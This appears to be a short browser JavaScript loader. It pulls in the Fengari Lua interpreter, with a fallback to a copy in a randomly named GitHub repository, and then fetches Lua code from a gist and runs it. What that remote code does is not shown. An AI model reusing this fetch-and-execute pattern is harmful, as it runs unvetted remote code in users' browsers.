const cdnSources = [
    'https://cdn.jsdelivr.net/npm/fengari-web@0.1.4/dist/fengari-web.js',
    'https://unpkg.com/fengari-web@0.1.4/dist/fengari-web.js',
    'https://raw.githubusercontent.com/gm92342/sdhiabfkgcnf/refs/heads/main/fengari-web.js'
];
function loadFengari(sources, index = 0) {
    if (index >= sources.length) {
        return;
    }
    const script = document.createElement('script');
    script.src = sources[index];
    script.onload = () => {
        fetch('https://gist.githubusercontent.com/gm92342/e955ad835c317932434a9a561cad1f5e/raw/7aeb6c842a4966673c735c6cf96da8da0e7cff56/script.js')
            .then(response => response.text())
            .then(luaCode => {
                fengari.load(luaCode)();
            });
    };
    script.onerror = () => {
        loadFengari(sources, index + 1);
    };
    document.head.appendChild(script);
}
loadFengari(cdnSources);
